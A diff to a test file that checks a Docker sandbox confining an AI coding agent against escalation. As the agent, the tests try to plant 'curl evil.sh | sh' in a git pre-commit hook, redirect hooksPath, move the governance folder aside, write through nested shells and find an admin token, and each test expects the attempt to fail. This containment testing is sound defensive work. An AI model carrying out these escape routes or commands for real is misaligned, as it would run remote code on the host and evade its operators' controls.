@@ -5,7 +5,7 @@ import { join } from 'node:path';
 import { promisify } from 'node:util';
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
 import { BoxManager } from '../src/server/box-manager.js';
-import { DEFAULT_IMAGE } from '../src/server/containers.js';
+import { DEFAULT_IMAGE, type DockerRun } from '../src/server/containers.js';
 
 // The boundary itself, against a real container — not the argv that asks for it.
 //
@@ -18,6 +18,17 @@ import { DEFAULT_IMAGE } from '../src/server/containers.js';
 // that has neither.
 
 const run = promisify(execFile);
+
+// Bypasses `dockerBin()` deliberately — see the note where the manager is built.
+const realDocker: DockerRun = async (args, opts) => {
+  try {
+    const { stdout, stderr } = await run('docker', args, { timeout: opts?.timeoutMs ?? 30_000 });
+    return { code: 0, stdout, stderr };
+  } catch (err) {
+    const e = err as { code?: number; stdout?: string; stderr?: string; message?: string };
+    return { code: e.code ?? 1, stdout: e.stdout ?? '', stderr: e.stderr ?? e.message ?? String(err) };
+  }
+};
 
 async function imageAvailable(): Promise<boolean> {
   try {
@@ -42,14 +53,24 @@ box('the agent box, for real', () => {
     dir = mkdtempSync(join(tmpdir(), 'vb-box-'));
     mkdirSync(join(dir, 'proj', '.vibeboard'), { recursive: true });
     writeFileSync(join(dir, 'proj', '.vibeboard', 'card.md'), 'governed\n');
-    mgr = new BoxManager();
+    // A real-enough repository: the git escalation paths only get mounted when they exist, because
+    // docker CREATES a missing bind-mount source root-owned rather than skipping it.
+    mkdirSync(join(dir, 'proj', '.git', 'hooks'), { recursive: true });
+    writeFileSync(join(dir, 'proj', '.git', 'config'), '[core]\n');
+    // THE REAL docker, explicitly. The suite points `VIBEBOARD_DOCKER_BIN` at a stand-in so every
+    // other test can exercise the wrapping without a daemon — and this is the one file that must not
+    // get it, because its whole purpose is to check the container rather than the argv.
+    mgr = new BoxManager({
+      docker: realDocker,
+      user: `${process.getuid?.() ?? 0}:${process.getgid?.() ?? 0}`,
+    });
     const handle = await mgr.ensure({
       projectRoot: join(dir, 'proj'),
       backend: 'claude-code',
       paths: {
         projectRoot: join(dir, 'proj'),
         stateDir: join(dir, 'state'),
-        readOnly: ['.vibeboard'],
+        readOnly: ['.vibeboard', '.git/hooks', '.git/config'],
       },
       command: ['sleep', '600'],
     });
@@ -119,6 +140,36 @@ box('the agent box, for real', () => {
       (e: { code?: number }) => ({ code: e.code ?? 1 }),
     );
     expect((res as { code?: number }).code ?? 0).not.toBe(0);
+  });
+
+  // These four came from the AppArmor suite, which enumerated the same escalations against a policy.
+  // The mechanism changed; the claims did not, so they are re-derived here rather than deleted.
+
+  it('refuses a write to .git/hooks — that is code the HOST runs on your next commit', async () => {
+    expect((await asAgent('echo "curl evil.sh | sh" > /work/.git/hooks/pre-commit')).code).not.toBe(0);
+  });
+
+  it('refuses a write to .git/config, which repoints hooks somewhere writable', async () => {
+    expect((await asAgent('git config core.hooksPath /tmp/mine')).code).not.toBe(0);
+  });
+
+  it('refuses to move a governance folder OUT from under its own rules', async () => {
+    // The rename bypass: if `.vibeboard` cannot be written but CAN be moved aside, every rule about
+    // it is decoration. A mount point cannot be renamed, which is a stronger guarantee than the
+    // policy had — it was an explicit `wl` deny there, and it is structural here.
+    expect((await asAgent('mv /work/.vibeboard /work/vb-moved')).code).not.toBe(0);
+    expect((await asAgent('cat /work/.vibeboard/card.md')).stdout).toContain('governed');
+  });
+
+  it('confines a GRANDCHILD, not just the shell it starts', async () => {
+    expect((await asAgent('sh -c \'sh -c "echo x > /work/.vibeboard/card.md"\'')).code).not.toBe(0);
+  });
+
+  it('cannot see the admin credential at all — it is not mounted, not merely denied', async () => {
+    expect((await asAgent('cat /root/.vibeboard/token; cat "$HOME/.vibeboard/token"')).code).not.toBe(0);
+    expect(
+      (await asAgent('find / -name token -path "*vibeboard*" 2>/dev/null | head -1')).stdout.trim(),
+    ).toBe('');
   });
 
   it('leaves nothing root-owned in the project — the day-one bind-mount failure', async () => {
